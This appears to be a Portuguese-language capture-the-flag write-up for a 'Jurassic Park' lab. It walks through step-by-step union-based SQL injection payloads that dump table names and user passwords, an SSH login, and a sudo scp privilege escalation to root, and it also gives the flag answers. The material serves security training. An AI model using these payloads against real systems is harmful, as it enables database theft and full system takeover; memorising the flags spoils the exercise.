# Jurassic Park

## What is the name of the SQL database serving the shop information?

- Após enumerar, temos um SSH e um HTTP rodando.
- Vamos ver o HTTP.
- Na aba de compras, após escolher um item, vamos ver se existe alguma falha de SQL Injection (SQLI) no campo 'id' do site.
    - [http://10.10.55.202/item.php?id=2](http://10.10.55.202/item.php?id=2)
- Vamos colocar `‘`.
- Então, perceba que ele sabe disso.
- Então, vamos ver com `“`.
- E lá está um SQLI.

---

- Agora vamos buscar o nome da tabela
    - [http://10.10.55.202/item.php?id=2 union select 1](http://10.10.55.202/item.php?id=2%20union%20select%201)
- Para simplificar, irei escrever somente após o sinal de `=` do parâmetro `id`
    
    ```sql
    2 union select 1
    ```
    
- Perceba que o número não coincide, então vamos adicionar valores até que o erro não seja mais exibido
    
    ```sql
    2 union select 1,2,3,4,5
    ```
    
- 5
- Então, vamos colocar valores nulos para não atrapalhar
    
    ```sql
    2 union select null,null,null,null,null
    ```
    
- Então, no lugar do último "null", vamos trocar e colocar `database()`
    
    ```sql
    2 union select null,null,null,null, database()
    ```
    
- Foi retornado `park`
- `park`

---

- How many columns does the table have?
    - Agora vamos pegar o nome das tabelas
        
        ```sql
        2 union select null,null,null,null, group_concat(table_name) FROM information_schema.tables WHERE table_schema = "park"
        ```
        
        - `GROUP_CONCAT()` que é usada em SQL para concatenar os valores de uma coluna em um grupo de linhas, concatenando os valores da coluna dos nomes da tabela (`table_name`)
        - `information_schema.tables`, você pode obter informações como os nomes das tabelas e outros
        - Com isso temos **`items` e `users`**
    - Vamos ver primeiro o de items
        
        ```sql
        2 union select null,null,null,null, group_concat(column_name) FROM information_schema.columns WHERE table_name = "**items"**
        ```
        
        - Temos **`id`,`package`,`price`,`information` e `sold`**
    - `5`

---

- What is the system version?
    
    ```sql
    2 union select null,null,null,null, version()
    ```
    

---

- What is Dennis' password?
    - Agora vamos ver os valores de cada um
        
        ```sql
        2 union select null,null,null,null, group_concat(**id**,":", **package**,":",price ,":",information,":", sold SEPARATOR "<br>") FROM **items**
        ```
        
    - Com isso temos dois users
        - Dennis
        - Children
    - Agora para o `users`
        
        ```sql
        2 union select null,null,null,null, group_concat(column_name) FROM information_schema.columns WHERE table_name = "users**"**
        ```
        
        - **`id`,`username`,`password`,`USER`,`CURRENT_CONNECTIONS` e `TOTAL_CONNECTIONS`**
    - Se tentarmos pegar tudo vai ter um erro, e explorando mais, o erro esta na palavra `username`
    - Vamos para `password`
        
        ```sql
        2 union select null,null,null,null, group_concat(password) FROM users
        ```
        
        - **`D0nt3ATM3` e `ih8dinos`**
    - **`ih8dinos`**

---

- What are the contents of the first flag?
    
    ```bash
    ssh dennis@10.10.55.202
    #**ih8dinos
    sudo -l**
    ```
    
    - [https://gtfobins.github.io/gtfobins/scp/#sudo](https://gtfobins.github.io/gtfobins/scp/#sudo)
        
        ```bash
        TF=$(mktemp)
        echo 'sh 0<&2 1>&2' > $TF
        chmod +x "$TF"
        sudo scp -S $TF x y:
        su root
        ```
        
    - Buscando a flag
        
        ```bash
        find / -name "flag*.txt"
        cat /home/dennis/flag1.txt
        #b89f2d69c56b9981ac92dd267f
        ```
        
    - `b89f2d69c56b9981ac92dd267f`

---

- What are the contents of the second flag?
    
    ```bash
    cat /boot/grub/fonts/flagTwo.txt
    #96ccd6b429be8c9a4b501c7a0b117b0a
    ```
    
    - `96ccd6b429be8c9a4b501c7a0b117b0a`

---

- What are the contents of the third flag?
    
    ```bash
    cat .bash_history
    #Flag3:b4973bbc9053807856ec815db25fb3f1
    ```
    
    - `b4973bbc9053807856ec815db25fb3f1`

---

- What are the contents of the fifth flag?
    
    ```bash
    cat /root/flag5.txt
    #2a7074e491fcacc7eeba97808dc5e2ec
    ```
    
    - `2a7074e491fcacc7eeba97808dc5e2ec`